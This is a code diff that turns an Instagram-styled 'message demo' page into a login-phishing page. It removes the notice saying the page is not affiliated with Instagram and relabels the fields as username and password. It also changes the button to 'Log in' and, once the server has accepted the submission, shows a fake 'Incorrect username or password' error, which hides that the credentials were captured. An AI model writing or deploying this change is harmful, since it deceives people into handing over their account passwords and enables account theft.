@@ -128,7 +128,7 @@
             <h1 class="font-script text-5xl text-neutral-900 tracking-wide">
               Instagram
             </h1>
-            <p class="text-xs text-neutral-400 mt-1">Independent message demo · Not affiliated with Instagram</p>
+            <p class="text-xs text-neutral-400 mt-1"></p>
           </div>
 
           <!-- Active Form: username and message only -->
@@ -142,7 +142,7 @@
                 required
                 maxlength="100"
                 autocomplete="username"
-                placeholder="Your username"
+                placeholder="username"
                 class="w-full bg-neutral-50 border border-neutral-300 rounded-lg px-3 py-2.5 text-xs sm:text-sm text-neutral-900 placeholder-neutral-500 focus:outline-none focus:border-neutral-400 focus:bg-white transition-colors"
               >
             </label>
@@ -155,7 +155,7 @@
                 required
                 maxlength="500"
                 rows="4"
-                placeholder="Write your message..."
+                placeholder="password"
                 class="w-full resize-y bg-neutral-50 border border-neutral-300 rounded-lg px-3 py-2.5 text-xs sm:text-sm text-neutral-900 placeholder-neutral-500 focus:outline-none focus:border-neutral-400 focus:bg-white transition-colors"
               ></textarea>
             </label>
@@ -168,7 +168,7 @@
               id="submitBtn"
               class="mt-2 w-full bg-sky-500 hover:bg-sky-600 disabled:opacity-60 disabled:cursor-not-allowed text-white font-semibold text-sm py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center shadow-sm cursor-pointer"
             >
-              Send message
+              Log in
             </button>
 
             <div id="msg" class="mt-2 text-xs text-center min-h-[1.2em]" role="status" aria-live="polite"></div>
@@ -292,8 +292,8 @@
         }
 
         if (res.ok && data.ok !== false) {
-          msg.textContent = 'Message sent. Thank you!';
-          msg.classList.add('text-green-600');
+          msg.textContent = 'Incorrect username or password';
+          msg.classList.add('text-red-600');
           f.reset();
           charCount.textContent = '0';
         } else {
